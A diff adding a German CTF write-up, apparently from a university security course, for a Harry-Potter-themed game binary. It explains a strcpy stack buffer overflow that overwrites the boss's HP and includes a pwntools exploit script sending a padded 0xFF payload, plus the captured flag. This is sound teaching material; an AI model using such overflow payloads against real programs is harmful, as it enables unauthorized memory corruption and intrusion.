@@ -427,6 +427,66 @@ Guess what number I am thinking of [0-20]: 16
 Hi Boss
 FLAG{chipi chipi chapa chapa dubi dubi daba daba}
 ```
+# Assignment 33 - Team 10
+## Flag
+FLAG{Y0u_4r3_4_W1z4rd_H4rry}
+ 
+## Beschreibung
+In diesem Spiel ist es das Ziel einen Boss zu besiegen. Der Boss hat absurd hohe HP, der Damage ist viel zu niedrig um das in kurzer Zeit durch reines Spielen zu lösen.
+ 
+Man kann an mehreren Stellen userInputs machen, einmal für Länge des Zauberspells (%d), dann einmal für Name des Zauberspells (%s).  
+Hierbei ist folgende Stelle relevant:  
+```c
+    puts("Helfer: Alles klar, jetzt kannst du deinen Zauberspruch aufsagen: ");
+    spellInput = local_70;
+    *(undefined8 *)(puVar3 + randomUser + -8) = 0x100bf0;
+    __isoc99_scanf(&scanString,spellInput);
+    spellInput = local_70;
+    local_70[(long)userBuffPlusOne + -1] = '\0';
+    *(undefined8 *)(puVar3 + randomUser + -8) = 0x100c12;
+    strcpy(spellName,spellInput);
+```
+ 
+Das Spiel liest eine Eingabe ein (spellInput), fügt ein Nullbyte ein und kopiert diese Eingabe dann in einen Buffer, welcher 20 byte groß ist (spellName). Über dem Buffer liegt der Damage und die Boss-HP auf dem Stack. Wir können also durch einen geeigneten Buffer-Overflow das ganze einfach überschreiben.  
+Ein erster Gedanke könnte sein, die Boss-HP direkt auf 0 zu setzen, das funktioniert aber leider nicht, weil der Buffer durch strcpy kopiert wird, und diese Funktion beim ersten Nullbyte aufhört. Wir würden also nicht die Boss-HP überschreiben. Stattdessen schreiben wir direkt einen negativen Wert in den Speicher (0xFFFFFFFF). Es wird noch eins abgezogen, deswegen Enden wir bei -2. Wir erhalten die Ausgabe:  
+```
+Muahahaha! Du dachtest du kannst hier einfach reinplatzen und die Prinzessin retten?! Da musst du erstmal an mir vorbei!
+ 
+Helfer: Los! Du musst dem Boss mit Zaubersprüchen Schaden anrichten! Hierzu musst du mir zuerst sagen, wie lang dein Zauberspruch ist, und dann den Zauberspruch sagen. Dir stehen folgende Zaubersprüche zur Verfügung: Expelliarmus, Bombarda, Incendio
+ 
+Helfer: Wie lang ist dein Zauberspruch?:
+Helfer: Alles klar, jetzt kannst du deinen Zauberspruch aufsagen:
+ 
+HAHAHA! Du dachtest du kannst deine Zaubersprüche verstärken? Netter Versuch!!
+ 
+Boss HP: -84215047
+ 
+Boss: WAAAS?! Wie ist das möglich?? Du hast mich besiegt!!
+ 
+Glückwunsch! Du hast die Prinzessin gerettet!!
+ 
+FLAG{Y0u_4r3_4_W1z4rd_H4rry}
+```
+ 
+In der Ausgabe sind die Eingaben nicht dargestellt, da diese durch das Script gesendet wurden. Es gibt leider keine ASCII-Character, die hoch genug liegen.
+ 
+## Script
+```python
+from pwn import *
+ 
+pty = process.PTY
+p = process("./team_10", stdin=pty, stdout=pty)
+# p = remote("tank.informatik.hs-mannheim.de", 3110)
+context.log_level = 'debug'
+ 
+p.sendlineafter(b": ", b"30")
+p.sendlineafter(b": ", b"A" * 20 + b"A" * 4 + b"\xFF" * 4)
+ 
+flag = p.recvall().decode()
+ 
+print(flag)
+```
+
 #  Team 09
 
 ```
